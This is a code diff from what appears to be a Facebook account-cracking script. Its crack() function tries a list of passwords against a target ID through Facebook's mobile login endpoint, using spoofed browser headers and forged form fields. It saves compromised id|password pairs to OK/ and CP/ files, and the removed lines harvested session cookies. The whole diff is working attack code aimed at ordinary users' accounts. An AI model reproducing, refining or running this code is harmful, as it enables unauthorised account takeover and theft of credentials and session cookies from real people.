@@ -228,64 +228,76 @@ def crack(idf, pwv):
     ua = aguss()
     for pw in pwv:
         try:
-            link = ses.get(f"https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1736472639792%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df4d9b57a435e11ba5%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff71f33a48b104696%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dpopup%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%26locale%3Den_US%26logger_id%3Dff5c4fef7e3d5cc40%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbfa713d78e1cd783%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff71f33a48b104696%2526relation%253Dopener%2526frame%253Df43043cb59adc9703%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfbfa713d78e1cd783%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fff71f33a48b104696%26relation%3Dopener%26frame%3Df43043cb59adc9703%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=en_GB&pl_dbl=0").text
             data = {
-                "lsd": re.search('name="lsd" value="(.*?)"', link).group(1),
-                "jazoest": re.search('name="jazoest" value="(.*?)"', link).group(1),
-                "prefill_contact_point": "",
+                "login_attempt": 0,
+                "lwv": 101,
+                "jazoest": 21138,
+                "lsd": "AVqqezdnwnc",
+                "display": "",
+                "isprivate": "",
+                "return_session": "",
+                "skip_api_login": "",
+                "signed_next": "",
+                "trynum": 1,
+                "timezone": -480,
+                "lgndim": "eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6OTAwLCJjIjoyNH0=",
+                "lgnrnd": "190607_aQpM",
+                "lgnjs": 1738551968,
+                "email": "sadasd",
+                "prefill_contact_point": "sadasd",
                 "prefill_source": "",
-                "prefill_type": "",
+                "prefill_type": "contact_point",
                 "first_prefill_source": "",
-                "first_prefill_type": "",
-                "had_cp_prefilled": False,
-                "had_password_prefilled": False
+                "first_prefill_type": "contact_point",
+                "had_cp_prefilled": True,
+                "had_password_prefilled": False,
+                "ab_test_data": "A/AVAAAAAAAVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfAA//AAAADAAA",
+                "encpass": f"#PWD_BROWSER:5:1738551996:{pw}"
             }
             headers = {
                 "Host": "m.facebook.com",
-                "content-length": "479",
-                "cache-control": "max-age=0",
-                "upgrade-insecure-requests": "1",
-                "origin": "https://m.facebook.com",
-                "content-type": "application/x-www-form-urlencoded",
-                "user-agent": ua,
                 "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                "x-requested-with": "com.opera.mini.native",
-                "sec-fetch-site": "same-origin",
-                "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-                "sec-fetch-mode": "navigate",
-                "sec-fetch-user": "?1",
-                "sec-fetch-dest": "document",
-                "priority":"u=0, i",
-                "sec-ch-ua-platform":'"macOS"',
-                "sec-ch-ua-mobile":"?0",
-                "upgrade-insecure-requests":"1",
-                "referer": f"https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1736472639792%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df4d9b57a435e11ba5%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff71f33a48b104696%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dpopup%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%26locale%3Den_US%26logger_id%3Dff5c4fef7e3d5cc40%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbfa713d78e1cd783%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff71f33a48b104696%2526relation%253Dopener%2526frame%253Df43043cb59adc9703%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfbfa713d78e1cd783%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fff71f33a48b104696%26relation%3Dopener%26frame%3Df43043cb59adc9703%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=en_GB&pl_dbl=0",
                 "accept-encoding": "gzip, deflate, br, zstd",
-                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+                "accept-language": "en-US,en;q=0.9",
+                "cache-control": "no-cache",
+                "content-length": 685,
+                "content-type": "application/x-www-form-urlencoded",
+                "dpr": "2",
+                "origin": "https://m.facebook.com",
+                "pragma": "no-cache",
+                "priority": "u=0, i",
+                "referer": f"https://m.facebook.com/login/web/?email={idf}&is_from_lara=1",
+                "sec-ch-prefers-color-scheme": "dark",
+                "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
+                "sec-ch-ua-full-version-list": '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6834.160", "Google Chrome";v="132.0.6834.160"',
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-model": '""',
+                "sec-ch-ua-platform": "macOS",
+                "sec-ch-ua-platform-version": "14.6.1",
+                "sec-fetch-dest": "document",
+                "sec-fetch-mode": "navigate",
+                "sec-fetch-site": "same-origin",
+                "sec-fetch-user": "?1",
+                "upgrade-insecure-requests": "1",
+                "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
+                "viewport-width": "771"
             }
-            po = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1736472639792%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df4d9b57a435e11ba5%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff71f33a48b104696%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dpopup%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%26locale%3Den_US%26logger_id%3Dff5c4fef7e3d5cc40%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbfa713d78e1cd783%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff71f33a48b104696%2526relation%253Dopener%2526frame%253Df43043cb59adc9703%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&popup=1&lwv=100", data=data, headers=headers, allow_redirects=False)
+            po = ses.post("https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100", data=data, headers=headers, allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f"{M2} Data Checkpoint")
-                print(f"{M2} id : [bold yellow]{idf}")
-                prints(f"\tid : [bold yellow]{idf}")
-                prints(f"\tpassword : [bold yellow]{pw}")
-                prints(f"\tuser agent : [bold yellow]{ua}")
-                print("}")
+                prints(f"{M2} Data Checkpoint")
+                prints(f"{M2} id : [bold yellow]{idf}")
+                prints(f"{M2} password : [bold yellow]{pw}")
+                prints(f"{M2} user agent : [bold yellow]{ua}")
                 open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                 akun.append(idf + '|' + pw)
                 cp += 1
                 break
-            elif "c_user" in ses.cookies.get_dict().keys() or 'href="https://web.facebook.com/?_rdc=1&_rdr"' in str(po):
+            elif "c_user" in ses.cookies.get_dict().keys():
                 ok += 1
-                coki = ses.cookies.get_dict()
-                kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
-                print("// data json success")
-                print("{")
-                prints(f"\tid : [bold green]{idf}")
-                prints(f"\tpassword : [bold green]{pw}")
-                prints(f"\tuser agent : [bold green]{ua}")
-                prints(f"\tcookies : [bold green]{kuki}")
-                print("}")
+                prints(f"{H2} Data success")
+                prints(f"{H2} id : {idf}")
+                prints(f"{H2} password : {pw}")
+                prints(f"{H2} user agent : {ua}")
                 open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + '\n')
                 break
             else:
